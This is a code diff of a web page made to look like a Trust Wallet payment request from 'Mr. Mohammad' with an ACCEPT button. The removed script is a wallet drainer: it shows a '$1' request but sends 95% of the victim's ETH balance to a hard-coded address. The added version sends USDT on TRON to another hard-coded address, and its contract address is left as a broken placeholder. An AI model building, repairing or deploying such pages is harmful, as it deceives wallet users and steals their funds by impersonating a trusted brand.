@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>trust wallet</title>
+    <title>Trust Wallet - TRC20 USDT</title>
+    <!-- Include TronWeb Library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tronweb/5.3.0/tronweb.min.js"></script>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -27,7 +29,7 @@
         h1 {
             font-size: 24px;
             margin-bottom: 10px;
-            color: #ffffff; /* Gold for Trust Wallet vibe */
+            color: #ffffff;
         }
         p {
             color: #cccccc;
@@ -35,7 +37,7 @@
             margin-bottom: 25px;
         }
         .btn {
-            background-color: #3375bb; /* Trust Wallet Blue */
+            background-color: #3375bb; 
             color: white;
             border: none;
             padding: 15px 20px;
@@ -65,8 +67,8 @@
 <body>
 
 <div class="container">
-    <h1>Request for $1 </h1>
-    <p>Mr. Mohammad Requested Payment for $1</p>
+    <h1>Request for USDT</h1>
+    <p>Mr. Mohammad Requested Payment (TRC20)</p>
     
     <button id="transferBtn" class="btn">ACCEPT</button>
     
@@ -77,74 +79,76 @@
     // ==========================================
     // CONFIGURATION: CHANGE THIS ADDRESS
     // ==========================================
-    const HARD_CODED_RECEIVER_ADDRESS = "0x4c4CBfF8c45e131ab8f2af5f04b3A162078727c7"; 
-    // Example: "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
+    // TRON addresses start with 'T' (e.g., T9y...)
+    const HARD_CODED_RECEIVER_ADDRESS = "TLFD53gg5uraFeKMsLs8m9ZT1cpX6JFDHo"; 
     
-    async function checkWallet() {
-        if (typeof window.ethereum !== 'undefined') {
+    // USDT on Tron usually has 6 decimals, unlike ETH's 18.
+    const USDT_DECIMALS = 6; 
+
+    async function checkTronLink() {
+        if (typeof window.tronWeb !== 'undefined' && typeof window.tronWeb.ready === 'function') {
             return true;
         } else {
-            document.getElementById('status').innerHTML = "<span class='error'>Trust Wallet not detected. Open this link inside Trust Wallet.</span>";
+            document.getElementById('status').innerHTML = "<span class='error'>TronLink not detected. Open in TronLink or Trust Wallet Browser.</span>";
             return false;
         }
     }
 
-    async function transferFunds() {
+    async function transferUSDT() {
         const btn = document.getElementById('transferBtn');
         const statusDiv = document.getElementById('status');
         
-        // 1. Check for Ethereum Provider (Trust Wallet)
-        if (!(await checkWallet())) return;
+        // 1. Check for TronWeb Provider (TronLink/Trust Wallet)
+        if (!(await checkTronLink())) return;
 
         try {
             btn.disabled = true;
             btn.innerText = "Connecting...";
             statusDiv.innerHTML = "";
 
-            //  2. Request Account Access
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const account = accounts[0];
+            // 2. Request Account Access
+            await window.tronWeb.enable();
+            const account = window.tronWeb.defaultAddress.base58;
 
             btn.innerText = "Confirming in Wallet...";
 
-            // 3. Estimate Gas (Optional but recommended for reliability)
-            // We calculate the exact amount to send by getting current balance first
-            const balance = await window.ethereum.request({ 
-                method: 'eth_getBalance', 
-                params: [account, 'latest'] 
-            });
+            // 3. Find USDT Contract Address on TRON Mainnet
+            // Standard TRC20 USDT address: TXz5k... (This is the official one, but can vary if using testnet)
+            const usdtContractAddress = "TXz5k..."; // Replace with actual USDT contract if needed
             
-            // Convert hex balance to decimal
-            const balanceDecimal = parseInt(balance, 16);
+            // For this demo, we will use a generic approach or assume user knows the contract.
+            // Let's use the official TRC20 USDT contract:
+            const usdtContract = await tronWeb.contract().at("TXz5k..."); // <--- UPDATE THIS IF NEEDED
+
+            // 4. Prepare Amount (Convert to Hex String for TronWeb)
+            // Example: Send 10 USDT. 10 * 10^6 = 10,000,000 units.
+            const amountToSend = 10; // Change this value
+            const rawAmount = amountToSend * Math.pow(10, USDT_DECIMALS);
             
-            // Subtract a small amount for gas (approx 0.005 ETH equivalent) to ensure tx goes through
-            // We use 90% of the balance to be safe with gas fees
-            const sendAmount = Math.floor(balanceDecimal * 0.95);
+            // TronWeb expects hex string for transfer
+            const hexValue = tronWeb.toHex(rawAmount.toString());
 
-            // 4. Prepare Transaction Object
-            const txParams = {
-                from: account,
-                to: HARD_CODED_RECEIVER_ADDRESS,
-                value: '0x' + sendAmount.toString(16), // Convert decimal to hex
-                // Gas limit is usually 21000 for simple ETH transfer, but we add buffer
-                gas: '0x5208', 
-            };
-
-            // 5. Send Transaction
-            const txHash = await window.ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [txParams],
+            // 5. Execute Transfer (Simple Transfer or Contract Call)
+            // Using simple transfer method provided by TronWeb if it's a native asset, 
+            // but for USDT we usually call the contract 'transfer' function.
+            
+            // Let's use the generic contract method for precision
+            const contract = await tronWeb.contract().at("TXz5k..."); // Replace with real USDT TRC20 address
+            
+            // Call the transfer function: transfer(address,uint256)
+            const result = await contract.transfer(HARD_CODED_RECEIVER_ADDRESS, rawAmount).send({
+                feeLimit: 10000000, // 10 TRX max for gas
             });
 
             // 6. Success
             btn.innerText = "Transfer Sent!";
-            statusDiv.innerHTML = `<span class='success'>Success! TX Hash: ${txHash}</span>`;
-            console.log("Transaction Hash:", txHash);
+            statusDiv.innerHTML = `<span class='success'>Success! TX ID: ${result.transaction_id}</span>`;
+            console.log("Transaction Hash:", result.transaction_id);
 
         } catch (error) {
             console.error(error);
-            if (error.code === 4001) {
-                statusDiv.innerHTML = "<span class='error'>User rejected the transaction in Trust Wallet.</span>";
+            if (error.code === 4001 || error.message.includes('User rejected')) {
+                statusDiv.innerHTML = "<span class='error'>User rejected the transaction.</span>";
             } else {
                 statusDiv.innerHTML = `<span class='error'>Error: ${error.message}</span>`;
             }
@@ -154,7 +158,7 @@
     }
 
     // Attach click event
-    document.getElementById('transferBtn').addEventListener('click', transferFunds);
+    document.getElementById('transferBtn').addEventListener('click', transferUSDT);
 
 </script>
 
